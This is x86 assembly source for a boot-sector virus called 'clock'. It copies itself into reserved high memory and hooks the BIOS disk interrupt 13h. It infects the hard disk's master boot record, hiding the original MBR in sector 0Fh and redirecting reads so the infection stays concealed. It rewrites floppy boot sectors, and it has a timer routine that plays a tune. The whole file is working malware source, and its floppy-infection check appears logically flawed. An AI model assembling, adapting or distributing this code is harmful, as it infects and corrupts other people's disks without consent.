PAGE 80,132

seg_one         segment byte public
                assume  CS:seg_one, DS:seg_one

                org     0
start:
;=============================================================================
;               PRIMARY PROCEDURE
;-----------------------------------------------------------------------------
load_position   equ     7C00h                   ;loading position
vector_13       equ     004Ch                   ;interrupt vector 13h
vector_08       equ     0020h                   ;interrupt vector 08h
memory_size     equ     0413h                   ;free memory size
length_body     equ     0100h                   ;length body in word
;-----------------------------------------------------------------------------
clock           proc    far
                cld
                cli
                xor     AX, AX
                mov     DS, AX                  ;DS = 0
                mov     ES, AX                  ;ES = 0
                mov     SS, AX                  ;SS = 0
                mov     SP, load_position       ;SP = 7C00h
;-----------------------------------------------------------------------------
;               save interrupt 08h
;-----------------------------------------------------------------------------
                mov     SI, vector_08
                mov     DI, load_position+offset ROM_08
                movsw
                movsw
;-----------------------------------------------------------------------------
;               save interrupt 13h
;-----------------------------------------------------------------------------
                mov     SI, vector_13
                mov     DI, load_position+offset ROM_13
                movsw
                movsw
;-----------------------------------------------------------------------------
;               allocate memory to upper address
;-----------------------------------------------------------------------------
                mov     AX, word ptr DS:memory_size
                dec     AX
                mov     word ptr DS:memory_size, AX
;-----------------------------------------------------------------------------
;               calculation segment
;-----------------------------------------------------------------------------
                mov     CL, 6
                shl     AX, CL                  ;calculation byte to Kbyte
                push    AX                      ;load in stack CS
                mov     ES, AX
;-----------------------------------------------------------------------------
;               set new interrupt 08h
;-----------------------------------------------------------------------------
;                mov     word ptr DS:vector_08, offset int_08
;                mov     word ptr DS:vector_08+2, AX
;-----------------------------------------------------------------------------
;               set new interrupt 13h
;-----------------------------------------------------------------------------
                mov     word ptr DS:vector_13, offset int_13
                mov     word ptr DS:vector_13+2, AX
;-----------------------------------------------------------------------------
;               transmit body in allocate memory and jump
;-----------------------------------------------------------------------------
                mov     AX, offset disk_work
                push    AX                      ;load in stack IP
                mov     SI, load_position       ;SI = 7C00h
                mov     BX, SI                  ;BX = 7C00h
                xor     DI, DI                  ;DI = 0
                mov     CX, length_body
                rep     movsw                   ;transmit CX words
                sti
                retf                            ;jump to allocated memory
clock           endp
;=============================================================================
;               PLAY DATA
;-----------------------------------------------------------------------------
E_4             equ     0E23h
Fd_4            equ     0C98h
G_4             equ     0BE3h
A_4             equ     0A97h
B_4             equ     096Fh
C_5             equ     08E8h
still           equ     0054h
;-----------------------------------------------------------------------------
melody          dw      E_4
                db      9
                dw      G_4
                db      9
                dw      B_4
                db      9
                dw      G_4
                db      9
                dw      A_4
                db      18
                dw      G_4
                db      9
                dw      Fd_4
                db      9
                dw      B_4
                db      18
                dw      A_4
                db      18
                dw      E_4
                db      21
                dw      still
                db      90
squeak          dw      still
                db      15
                dw      C_5
                db      3
;=============================================================================
;               INTERRUPT 08H
;-----------------------------------------------------------------------------
timer_ticks     equ     046Ch                   ;timer word
strike_time     equ     0FF00h                  ;the striking of a clock
PPI_B           equ     61h                     ;PPI - port B
speaker_on      equ     03h                     ;speaker on
speaker_off     equ     0fCh                    ;speaker off
timer           equ     43h                     ;timer command port
latch_2         equ     42h                     ;timer latch register 2
mode_latch_2    equ     0B6h                    ;set mode latch regisrer 2
final_melody    equ     90                      ;final melody
final_squeak    equ     3                       ;final squeak
;-----------------------------------------------------------------------------
int_08:
                push    AX
                push    ES
                xor     AX, AX
                mov     ES, AX
                cmp     word ptr ES:timer_ticks, strike_time
                jne     silent
                push    CX
                push    SI
                push    DI
                push    DS
                push    CS
                pop     DS
                mov     SI, offset ROM_08
                mov     DI, vector_08
                cli
                movsw
                movsw
                pushf
                db      9Ah                     ;call to procedure (vector 08h)
ROM_08          dd      0                       ;address ROM BIOS 08h
                in      AL, PPI_B
                or      AL, speaker_on
                out     PPI_B, AL
                mov     AL, mode_latch_2
                out     timer, AL
                mov     CX, 3
repeat_melody:
                mov     SI, offset melody
                mov     DI, final_melody
                call    play
                loop    repeat_melody
                mov     CX, 6
repeat_squeak:
                mov     SI, offset squeak
                mov     DI, final_squeak
                call    play
                loop    repeat_squeak
                in      AL, PPI_B
                and     AL, speaker_off
                out     PPI_B, AL
                cli
                mov     word ptr ES:vector_08, offset int_08
                mov     word ptr ES:vector_08+2, DS
                pop     DS
                pop     DI
                pop     SI
                pop     CX
                pop     ES
                pop     AX
                iret
silent:
                pop     ES
                pop     AX
                jmp     CS:ROM_08
;=============================================================================
;               PLAY
;-----------------------------------------------------------------------------
play            proc    near
                lodsw
                out     latch_2, AL
                mov     AL, AH
                out     latch_2, AL
                lodsb
                cbw
                push    AX
                add     AX, word ptr ES:timer_ticks
pause:
                cmp     AX, word ptr ES:timer_ticks
                jne     pause
                pop     AX
                cmp     AX, DI
                jne     play
                ret
play            endp
;=============================================================================
;               PROCESSING DISK'S
;-----------------------------------------------------------------------------
read_sector     equ     0201h                   ;read one sector
save_sector     equ     0301h                   ;save one sector
hard_disk       equ     0080h                   ;hard disk - 1, head - 0
hide_MBR        equ     0Fh                     ;hide MBR sector number
MBR             equ     01h                     ;MBR sector number
;-----------------------------------------------------------------------------
disk_work:
                xor     AX, AX                  ;AX = 0
                mov     ES, AX                  ;ES = 0
                push    AX                      ;load in stack CS
                push    BX                      ;load in stack IP
                mov     DX, hard_disk           ;both hard disks and floppy
                call    bios_13                 ;disks reset
                push    CS
                pop     DS                      ;DS = CS
                mov     AX, read_sector         ;read one sector
                mov     CL, hide_MBR            ;cylinder - 0, sector - 0Fh
                call    bios_13                 ;read hide MBR
                cmp     status, 'i'
                je      load_boot               ;jump if load hard disk
                mov     CL, MBR                 ;cylinder - 0, sector - 1
                mov     AX, read_sector         ;read one sector
                mov     BX, AX
                dec     BX                      ;BX = 0200h
                push    CS
                pop     ES                      ;ES = CS
                call    bios_13                 ;read MBR (or body)
                jc      load_boot               ;jump if error
                call    compare_sectors         ;compare MBR and body
                jne     different               ;jump if MBR
load_boot:
                mov     status, 'o'             ;set status - floppy disk
                retf
different:
                mov     status, 'i'             ;set status - hard disk
                pop     AX                      ;clear stack
                pop     CX                      ;clear stack
                push    ES                      ;load in stack CS
                push    BX                      ;load in stack IP
                mov     AX, save_sector         ;save one sector
                mov     CL, hide_MBR            ;cylinder - 0, sector - 0Fh
                call    bios_13                 ;save MBR
                jc      load_boot               ;jump if error
                mov     AX, save_sector         ;save one sector
                mov     CL, MBR                 ;cylinder - 0, sector - 1
                xor     BX, BX                  ;BX = 0
                call    bios_13                 ;save body
                jmp     short load_boot
;=============================================================================
;               INTERRUPT 13H
;-----------------------------------------------------------------------------
function_read   equ     02h                     ;function read sector
function_save   equ     03h                     ;function save sector
motor_status    equ     043Fh                   ;diskette motor status
motor_on        equ     03h                     ;diskette 0 and 1 motor on
buffer_position equ     0200h                   ;buffer position
boot_sector     equ     01h                     ;boot sector
attempt_number  equ     0003h                   ;attempt number read disk's
;-----------------------------------------------------------------------------
int_13:
                push    DS
                push    AX                      ;save registers
                cmp     AH, function_read       ;test function to
                jne     end_13                  ;save and read sectors
                cmp     AH, function_save
                jne     end_13
                test    DL, hard_disk           ;check hard disk
                jnz     hard_13                 ;jump if hard disk
                xor     AX, AX                  ;reset AX
                mov     DS, AX                  ;DS = 0
                test    byte ptr DS:motor_status, motor_on
                jnz     end_13                  ;exit if motor on
                push    BX
                push    CX
                push    DX
                push    SI
                push    DI
                push    ES                      ;save registers
                push    CS
                pop     DS                      ;DS = CS
                push    CS
                pop     ES                      ;ES = CS
                mov     SI, attempt_number      ;read sector number times
                mov     BX, buffer_position     ;buffer position
                mov     CX, boot_sector         ;boot sector
                mov     DH, 0                   ;head - 0
next_attempt:
                mov     AX, read_sector
                call    bios_13
                jnc     check_boot
                xor     AX, AX                  ;reset floppy disk
                call    bios_13
                dec     SI                      ;decrement attempt number
                jnz     next_attempt            ;jump if have attempt
                jmp     short no_save           ;exit if not successful
check_boot:
                call    compare_sectors         ;compare sectors
                je      no_save                 ;jump if body
                mov     AX, save_sector         ;save sector
                xor     BX, BX                  ;body place
                call    bios_13
no_save:
                pop     ES
                pop     DI
                pop     SI
                pop     DX
                pop     CX
                pop     BX                      ;restore registers
                jmp     short end_13            ;exit
hard_13:
                cmp     DH, 0                   ;control head 0
                jnz     end_13                  ;if not zero - jump
                cmp     CH, 0                   ;control cylinder 0
                jnz     end_13                  ;if not zero - jump
                cmp     CL, MBR                 ;control sector MBR
                je      change                  ;if MBR - jump
                cmp     CL, hide_MBR            ;contol hide MBR
                jne     end_13                  ;jf not hide MBR - jump
                dec     CX                      ;decrement sector
                jmp     short end_13            ;exit
change:
                mov     CL, hide_MBR            ;change MBR to hide MBR
end_13:
                pop     AX
                pop     DS                      ;restore registers
                db      0EAh                    ;jump to procedure (vector 13h)
ROM_13          dd      0                       ;address ROM BIOS 13h
;=============================================================================
;               CALL ROM BIOS INTERRUPT 13H
;-----------------------------------------------------------------------------
bios_13         proc    near
                pushf                           ;save flags
                call    ROM_13
                ret                             ;return
bios_13         endp
;=============================================================================
;               COMPARE SECTORS (two words)
;-----------------------------------------------------------------------------
compare_sectors proc    near
                mov     DI, offset continue_name
                mov     SI, offset continue_name + 200h
                cmpsw                           ;compare word
                jne     differ                  ;if different - jump
                cmpsw                           ;compare word
differ:
                ret
compare_sectors endp
;=============================================================================
;               NAME BODY
;-----------------------------------------------------------------------------
name_body       db      'cl'                    ;name body
status          db      'o'                     ;status (hard disk or memory)
continue_name   db      'ck'                    ;continuation name body
;=============================================================================
;               END OF PROGRAMM
;-----------------------------------------------------------------------------
key_position    equ     01FEh                   ;position word extended BIOS
key             equ     0AA55h                  ;word check extended BIOS
;-----------------------------------------------------------------------------
                org     key_position
                dw      key
;-----------------------------------------------------------------------------
seg_one         ends

                end     start
